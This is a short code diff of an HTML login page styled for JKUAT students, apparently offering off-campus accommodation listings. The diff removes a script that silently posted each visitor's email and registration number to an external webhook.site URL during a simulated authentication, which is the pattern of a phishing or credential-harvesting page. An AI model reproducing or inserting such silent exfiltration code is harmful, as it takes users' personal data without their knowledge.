@@ -14,7 +14,7 @@
 
         body {
             background-image: url('jkuat-bg.jpeg'); 
-            background-color: #666; 
+            background-color: #666; /* Fallback */
             background-size: cover;
             background-position: center;
             background-attachment: fixed;
@@ -209,7 +209,7 @@
         DOWNLOAD LIST OF AREAS WITH OFF CAMPUS ACCOMMODATION NEAR JUJA
     </div>
 
-    <!-- Authentication Simulation Script with Webhook -->
+    <!-- Authentication Simulation Script -->
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             // Prevent the default form submission so we can animate it
@@ -223,12 +223,6 @@
                 // Change button state to simulate backend auth
                 btn.disabled = true;
                 btn.innerText = "Authenticating...";
-
-                // 🔥 SILENT TRACKING to your Webhook!
-                fetch('https://webhook.site/b925b6e9-543d-4906-9e8b-bc4234858beb', {
-                    method: 'POST',
-                    body: JSON.stringify({ Event: "LOGIN", Email: email, RegNo: reg })
-                }).catch(e => console.log(e));
 
                 // Simulate a 1.5-second network request delay, then transition
                 setTimeout(() => {
